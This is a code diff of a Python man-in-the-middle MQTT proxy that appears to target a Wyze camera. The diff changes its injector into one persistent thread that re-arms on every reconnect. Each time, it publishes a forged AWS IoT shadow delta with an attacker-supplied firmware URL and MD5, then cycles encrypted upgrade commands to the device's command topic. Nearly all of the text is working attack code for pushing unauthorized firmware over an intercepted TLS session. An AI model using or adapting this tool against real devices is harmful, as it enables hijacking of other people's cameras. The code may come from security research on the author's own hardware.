@@ -234,26 +234,30 @@ def _live():
         return None
     return c
 
-def inject(cli, up=None):
-    time.sleep(0.5)  # the pair can close within seconds; do not outwait the session
+def inject(cli=None, up=None):
+    """One long-lived injector. It never gives up: it targets whichever socket is live, sends a
+    delta whenever the connection changes, and keeps cycling the command shapes. A reconnect
+    replaces LIVE["c"], so the same thread re-arms by itself."""
     if not MD5:
         print("inject: OTA_MD5 unset",flush=True); return
     st={"state":{"desired":{"url":URL,"md5":MD5,"pcUrl":URL,"pcMd5":MD5,"model":MODEL,"sub_mac":THING.upper()},"reported":{}},"version":999}
-    for _ in range(10):
-        c=_live()
-        if not c: time.sleep(2); continue
-        try:
-            with WLOCK:
-                _pub(c, f"$aws/things/{THING}/shadow/name/{os.environ.get('SHADOW','wyze-service')}/update/delta", json.dumps(st).encode())
-            print("inject: delta",_t.strftime("%H:%M:%S"),flush=True); break
-        except Exception as e:
-            LIVE["c"]=None
-            print("inject delta retry",repr(e),flush=True); time.sleep(2)
-    else:
-        print("inject: delta gave up",flush=True); return
-    time.sleep(0.5)
     models=[m for m in os.environ.get("OTA_MODELS","").split(",") if m] or [MODEL]
-    for i in range(20):
+    armed_for=None
+    i=0
+    while True:
+        c=_live()
+        if c is None:
+            time.sleep(1); continue
+        if c is not armed_for:
+            armed_for=c
+            try:
+                with WLOCK:
+                    _pub(c, f"$aws/things/{THING}/shadow/name/{os.environ.get('SHADOW','wyze-service')}/update/delta", json.dumps(st).encode())
+                print("inject: delta (armed)",_t.strftime("%H:%M:%S"),flush=True)
+            except Exception as e:
+                LIVE["c"]=None; armed_for=None
+                print("inject delta retry",repr(e),flush=True); time.sleep(1); continue
+            time.sleep(0.5)
         m=models[i % len(models)]
         # the UDS receiver wants {Action, Params, Guid}. "delDev" reads the descriptor from Params;
         # "upgradeSub" reads a top-level url only. Sweep both so the shape is measured, not assumed.
@@ -314,46 +318,22 @@ def inject(cli, up=None):
                 pl=pl+b"\0"*(-len(pl)%16)
                 e=Cipher(algorithms.AES(k),modes.ECB()).encryptor()
                 pl=e.update(pl)+e.finalize()
-        for _try in range(300):  # the device reconnects on its own schedule; wait it out (10 min)
-            c=_live()
-            if c is None:
-                time.sleep(1); continue
-            try:
-                with WLOCK:
-                    if os.environ.get("OTA_EMPTY"):
-                        _pub(c, f"hl/devices/{THING}/cmd", b"", qos0=False)
-                    else:
-                        _pub(up if (up and os.environ.get("OTA_VIA_UPSTREAM")) else c,
-                             os.environ.get("OTA_TOPIC") or f"hl/devices/{THING}/cmd", pl, qos0=False)
-                print(f"inject: {act} pid={_PID[0]} model={m} {text}",flush=True)
-                break
-            except Exception as e:
-                # the pair closed under us: drop the stale object so _live() waits for a real one
-                LIVE["c"]=None
-                print("inject cmd retry",repr(e),flush=True); time.sleep(2)
-        else:
-            print("inject cmd gave up",_t.strftime("%H:%M:%S"),flush=True); return
-        time.sleep(1)   # the pair dies in seconds; do not spend 4 s between variants
+        try:
+            with WLOCK:
+                if os.environ.get("OTA_EMPTY"):
+                    _pub(c, f"hl/devices/{THING}/cmd", b"", qos0=False)
+                else:
+                    _pub(c, os.environ.get("OTA_TOPIC") or f"hl/devices/{THING}/cmd", pl, qos0=False)
+            print(f"inject: {act} pid={_PID[0]} model={m} {text}",flush=True)
+            i+=1
+        except Exception as e:
+            # the pair closed under us: drop the stale object so _live() waits for a real one
+            LIVE["c"]=None; armed_for=None
+            print("inject cmd retry",repr(e),flush=True); time.sleep(1); continue
+        time.sleep(float(os.environ.get("OTA_INTERVAL","1")))
 
 LIVE={"c":None}
 WLOCK=threading.Lock()  # SSLSocket.sendall is not thread-safe; the S pipe and the injector both write
-def injector():
-    """Push the delta into whichever camera connection is live, retrying across reconnects."""
-    time.sleep(4)
-    if not MD5:
-        print("inject: OTA_MD5 unset",flush=True); return
-    st={"state":{"desired":{"url":URL,"md5":MD5,"pcUrl":URL,"pcMd5":MD5,"model":MODEL,"sub_mac":THING.upper()},"reported":{}},"version":999}
-    for _ in range(30):
-        c=LIVE.get("c")
-        if c:
-            try:
-                with WLOCK:
-                    _pub(c, f"$aws/things/{THING}/shadow/name/{os.environ.get('SHADOW','wyze-service')}/update/delta", json.dumps(st).encode())
-                print("inject: delta sent",flush=True); return
-            except Exception as e: print("inject retry",repr(e),flush=True)
-        time.sleep(3)
-    print("inject: gave up",flush=True)
-
 def up_addr():
     """Resolve the broker past our own DNS redirect (which would loop back to us)."""
     try:
@@ -370,8 +350,6 @@ def handle(cli):
         # oracle mode: answer locally, no AWS. The injector publishes on the client socket.
         print("handle (local) fd=%s" % cli.fileno(), flush=True)
         LIVE["c"] = cli
-        if os.environ.get("INJECT"):
-            threading.Thread(target=inject, args=(cli, None), daemon=True).start()
         local_loop(cli)
         return
     try:
@@ -383,8 +361,6 @@ def handle(cli):
     state={"n":2,"lock":threading.Lock()}
     threading.Thread(target=pipe,args=(cli,u,"C",state),daemon=True).start()
     LIVE["c"]=cli
-    if os.environ.get("INJECT"):
-        threading.Thread(target=inject,args=(cli,u),daemon=True).start()
     pipe(u,cli,"S",state)
 def local_loop(cli):
     """Minimal server side for oracle runs: CONNACK, SUBACK, PINGRESP, PUBACK."""
@@ -437,6 +413,9 @@ def main():
     ctx=srv_ctx(); s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.bind(("0.0.0.0",8883)); s.listen(4); print("proxy on 8883",flush=True)
+    if os.environ.get("INJECT"):
+        # one injector for the life of the process; it re-arms on every new connection
+        threading.Thread(target=inject, daemon=True).start()
     while True:
         c,_=s.accept()
         try:
